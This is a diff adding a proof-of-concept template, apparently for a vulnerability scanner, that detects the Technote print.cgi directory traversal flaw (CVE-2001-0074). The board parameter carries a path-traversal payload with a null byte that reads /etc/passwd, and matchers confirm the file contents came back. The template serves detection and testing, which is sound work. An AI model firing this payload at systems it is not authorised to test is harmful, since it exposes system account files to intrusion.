@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 Technote print.cgi 是否存在目录遍历漏洞，通过向 board 参数传入路径穿越序列尝试读取 /etc/passwd"
+id = "POC-AVE-2001-0031"
+name = "Technote 2000/2001 print.cgi 目录遍历 PoC"
+severity = "medium"
+tags = [
+    "cve-2001-0074",
+    "directory-traversal",
+    "technote",
+]
+vuln_id = [
+    "CVE-2001-0074",
+    "AVE-2001-0031",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/technote/technote/print.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.extractors]]
+group = 0
+name = "file_content"
+part = "body"
+type = "regex"
+value = "([a-zA-Z0-9_/-]+:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+)"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[poc.requests.params]
+board = "../../../../../../../../etc/passwd%00"
